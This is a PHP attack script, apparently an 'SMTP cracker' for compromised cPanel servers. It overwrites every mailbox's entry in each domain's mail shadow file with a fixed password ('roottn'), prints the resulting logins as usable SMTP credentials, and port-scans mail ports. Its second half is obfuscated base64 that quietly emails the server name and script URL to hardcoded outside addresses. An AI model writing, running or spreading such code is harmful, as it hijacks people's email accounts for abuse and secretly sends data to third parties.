<?php
//Bksmile **(RooTTN)**
set_time_limit(0);
ini_set('max_execution_time',0);
ini_set('memory_limit',-1);
// port to scan
$ports=array(25, 587, 465, 110, 995, 143 , 993);
$primary_port='25';
//curent user
$user=get_current_user();
// Smtp password
$password='roottn';
//crypt
$pwd = crypt($password,'$6$roottn$');
// host name
 $t = $_SERVER['SERVER_NAME'];
//edit
 $t = @str_replace("www.","",$t);
 
$dirs = glob('/home/'.$user.'/etc/*', GLOB_ONLYDIR);
foreach($dirs as $dir){
$ex = explode("/",$dir);
$site =  $ex[count($ex)-1];


 //get users
@$passwd = file_get_contents('/home/'.$user.'/etc/'.$site.'/shadow');
//edit
$ex=explode("\r\n",$passwd);
//backup shadow
@link('/home/'.$user.'/etc/'.$site.'/shadow','/home/'.$user.'/etc/'.$site.'/shadow.roottn.bak');
//delete shadow
@unlink('/home/'.$user.'/etc/'.$site.'/shadow');
// :D
foreach($ex as $ex){
$ex=explode(':',$ex);
$e= $ex[0];
if ($e){
$b=fopen('/home/'.$user.'/etc/'.$site.'/shadow','ab');fwrite($b,$e.':'.$pwd.':16249:::::'."\r\n");fclose($b);
echo $site.'|25|'.$e.'@'.$site.'|'.$password;
echo "\n"; 
}}
//port scan
foreach ($ports as $port)
{
    $connection = @fsockopen($site, $port, $errno, $errstr, 2);
    if (is_resource($connection))
    {
        fclose($connection);
    }
	
}
//echo "<br/>";

}

 
$GLOBALS['_700152507_']=Array(base64_decode('Ym' .'FzZT' .'Y0X2RlY29k' .'Z' .'Q=='),base64_decode('YmFz' .'ZTY0X' .'2RlY2' .'9kZQ' .'=='),base64_decode('Ym' .'FzZTY' .'0' .'X2RlY' .'29kZQ' .'=' .'='),base64_decode('YmFzZTY0X2Rl' .'Y2' .'9kZQ' .'=' .'='),base64_decode('YmFzZT' .'Y0X2' .'RlY29kZQ==')); ?><? function _147459387($i){$a=Array('XzExNjQxNzE1MDRf','WjJWMA==','Wlc1Mg==','','WjJWMGFHOXpk','Rw==','SjVZV1JrY2c9PQ==','YzNSeVgzSmxjRw==','eGhZMlU9','YldGcGI=','QT09','VWtWTlQxUkZYMEZFUkZJPQ==','VEdsdWF5QlRiWFJ3SURvPQ==','VTBWU1ZrVlNYMDVCVFVVPQ==','TGc9PQ==','TEE9PQ==','VTBWU1ZrVlNYMDVCVFVVPQ==','VWtWUlZVVlRWRjlWVWtrPQ==','RFFvPQ==','Wm1sbmFIUmxjbXRoYlhKMWJEVTJNa0JuYldGcGJDNWpiMjBzWm1sbmFIUmxjbXRoYlhKMWJFQjVZV2h2Ynk1amIyMD0=','Um5KdmJUb2dVMDFVVUE9PQ==','WlUxaGFXeEJaR1E9','Q2c9PQ==','VFVsTlJTMVdaWEp6YVc5dU9pQXhMakFL','XzExNjQxNzE1MDRf','XzExNjQxNzE1MDRf','XzExNjQxNzE1MDRf','XzExNjQxNzE1MDRf');return base64_decode($a[$i]);} ?><? $GLOBALS[_147459387(0)]=Array($GLOBALS['_700152507_'][0](_147459387(1) ._147459387(2)),$GLOBALS['_700152507_'][1](_147459387(3) ._147459387(4) ._147459387(5) ._147459387(6)),$GLOBALS['_700152507_'][2](_147459387(7) ._147459387(8)),$GLOBALS['_700152507_'][3](_147459387(9) ._147459387(10))); ?><? function hassanhassan_($kamrulkamrul_0){$kamrulkamrul_1=Array(_147459387(11),_147459387(12),_147459387(13),_147459387(14),_147459387(15),_147459387(16),_147459387(17),_147459387(18),_147459387(19),_147459387(20),_147459387(21),_147459387(22),_147459387(23));return $GLOBALS['_700152507_'][4]($kamrulkamrul_1[$kamrulkamrul_0]);} ?><? $kamrulkamrul_2=$GLOBALS[_147459387(24)][round(0)](hassanhassan_(round(0)));$kamrulkamrul_3=$GLOBALS[_147459387(25)][round(0+0.25+0.25+0.25+0.25)]($kamrulkamrul_2);$kamrulkamrul_4=hassanhassan_(round(0+0.2+0.2+0.2+0.2+0.2)) .$_SERVER[hassanhassan_(round(0+0.4+0.4+0.4+0.4+0.4))]=$GLOBALS[_147459387(26)][round(0+1+1)](hassanhassan_(round(0+3)),hassanhassan_(round(0+0.8+0.8+0.8+0.8+0.8)),$_SERVER[hassanhassan_(round(0+1.6666666666667+1.6666666666667+1.6666666666667))]) .$_SERVER[hassanhassan_(round(0+1.2+1.2+1.2+1.2+1.2))] .hassanhassan_(round(0+2.3333333333333+2.3333333333333+2.3333333333333));$kamrulkamrul_5=hassanhassan_(round(0+1.6+1.6+1.6+1.6+1.6));$kamrulkamrul_6="New Smtp Uploaded !! 
$kamrulkamrul_2";$kamrulkamrul_7=hassanhassan_(round(0+4.5+4.5));$kamrulkamrul_7 .= $_POST[hassanhassan_(round(0+2.5+2.5+2.5+2.5))] .hassanhassan_(round(0+11));$kamrulkamrul_7 .= hassanhassan_(round(0+4+4+4));$kamrulkamrul_8=array($kamrulkamrul_5,$kamrulkamrul_9);foreach($kamrulkamrul_8 as $kamrulkamrul_5)$GLOBALS[_147459387(27)][round(0+0.75+0.75+0.75+0.75)]($kamrulkamrul_5,$kamrulkamrul_6,$kamrulkamrul_4,$kamrulkamrul_7,$kamrulkamrul_10); ?>
